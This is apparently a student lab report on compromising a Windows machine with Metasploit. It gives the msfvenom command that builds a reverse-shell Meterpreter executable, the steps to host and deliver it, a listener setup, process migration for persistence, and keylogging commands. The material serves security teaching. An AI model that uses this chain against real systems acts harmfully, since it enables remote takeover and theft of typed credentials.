# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
![exp6_1](https://github.com/user-attachments/assets/2d594c6f-42da-4d42-a36b-28542ccc6d23)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![exp6_2](https://github.com/user-attachments/assets/65653a12-329f-43b3-9032-594694b0ddaf)

copy the fun.exe into the apache /var/www/html folder
![exp6_3](https://github.com/user-attachments/assets/ce07d36c-da61-489b-b938-16dbc0b462ca)

Start apache server sudo systemctl apache2 start
![exp6_4](https://github.com/user-attachments/assets/d8a2213f-6b0c-4f3f-bb80-58c9fa047177)

Check the status of apache2
![exp6_5](https://github.com/user-attachments/assets/f5ea45b6-f430-4284-aa91-936f59d1aed8)

Invoke msfconsole:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![exp6_6](https://github.com/user-attachments/assets/47ca61b4-94f2-4c12-8117-e4a530b973fe)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![exp6_7](https://github.com/user-attachments/assets/f6705ed8-bbb3-43dc-a822-cbe5f17435eb)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![exp6_8](https://github.com/user-attachments/assets/656d275c-175e-4460-8809-07b9de09b03c)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![exp6_9](https://github.com/user-attachments/assets/1db3c4e8-5954-4876-9630-82a5e52a1cf0)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![exp6_10](https://github.com/user-attachments/assets/1378325a-be9d-42e8-9afd-04c46c2d0231)

keyscan_dump Shows the keystrokes captured so far
![exp6_11](https://github.com/user-attachments/assets/269031dc-7a8d-43e0-aa51-11e62be30b25)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
